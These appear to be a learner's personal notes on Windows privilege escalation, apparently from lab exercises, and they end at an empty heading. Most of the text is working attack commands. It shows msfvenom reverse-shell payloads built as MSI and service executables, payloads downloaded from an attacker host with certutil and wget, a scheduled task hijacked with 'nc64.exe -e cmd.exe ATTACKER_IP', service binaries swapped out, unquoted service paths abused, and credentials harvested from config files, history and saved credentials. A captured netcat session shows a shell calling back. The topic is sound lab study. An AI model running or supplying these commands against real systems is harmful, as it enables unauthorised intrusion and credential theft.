C:\Users\Public>winPEASx64.exe

--------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------
 AlwaysInstallElevated set to 1 in HKLM!
 AlwaysInstallElevated set to 1 in HKCU!

https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/

a) create  mis

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.236 lport=4142 -a x64 --platform windows -f msi -o ignite.msi

b) put to windows
certutil.exe -urlcache -f http://192.168.45.236:5566/ignite.msi ignite.msi

c) run exploit but have to make nc 

msiexec /quiet /qn /i ignite.msi

d) nc listener
┌──(kali㉿kali)-[~/Desktop/opt/winPEAS]
└─$ nc -lnvp 4142                      
listening on [any] 4142 ...
connect to [192.168.45.236] from (UNKNOWN) [192.168.183.55] 51672
Microsoft Windows [Version 10.0.19042.1526]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami

TTHM windows privilge escalation:


Files to check:
    C:\Unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml

--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

PowerShell history:
	type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

Saved Windows Credentials ():
	cmdkey /list     
			...
			User WPRIVESC1\mike.katz
	runas /savecred /user:admin cmd.exe
			runas /savecred /user:mike.katz cmd.exe
	
--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

IIS Configuration:
	
    C:\inetpub\wwwroot\web.config
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

	many data, but can search:
	type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString	

--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

Retrieve Credentials from Software: PuTTY
	reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

Scheduled Tasks:
	C:\> schtasks:
		or specyfy one task "vulntask"
		C:\> schtasks /query /tn vulntask /fo list /v
	
	can add to sheaduled task schtask.bat sth like:
		C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
		and listen on kali  $nc -lnvp 4444

	run task on local privilge to test only: 
			C:\> schtasks /run /tn vulntask
--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

AlwaysInstallElevated:
	C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
	C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

	create payload/exploid:
		msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi

	 run the installer with the command:
		C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

Windows Services:
	C:\> sc qc
	C:\> sc qc apphostsvc
	All of the services configurations are stored on the registry under 
		HKLM\SYSTEM\CurrentControlSet\Services
	
	C:\> sc qc WindowsScheduler
		If it has executable "WService.exe" associated with this service. we can check more:
	C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe 

	Attack will be on : 
		make payload:
			user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

		kali starts http server:
			user@attackerpc$ python3 -m http.server
			Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

		windows powershell:
			wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

		replace the service executable with our payload (cmd):
			C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
			        1 file(s) moved.

			C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
			        1 file(s) moved.

			C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
		        	Successfully processed 1 files.
			        	
		 in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges (or reboot system if have perm):		
			C:\> sc stop windowsscheduler
			C:\> sc start windowsscheduler


--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

Unquoted Service Paths (most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users). But how it works:

	we have Unquoted service:
		C:\> sc qc "disk sorter enterprise"
		... 
		BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe

			can execute: 
				C:\MyPrograms\Disk.exe  ; C:\MyPrograms\Disk Sorter.exe ; C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
	
		Attacking path:
			make exploit:
			user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

			listen:
			user@attackerpc$ nc -lvp 4446
	
        
			on windows:
				C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
				C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F

				start service in some way (for test):
					C:\> sc stop "disk sorter enterprise"
					C:\> sc start "disk sorter enterprise"
--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------

Insecure Service Permissions:
	
	



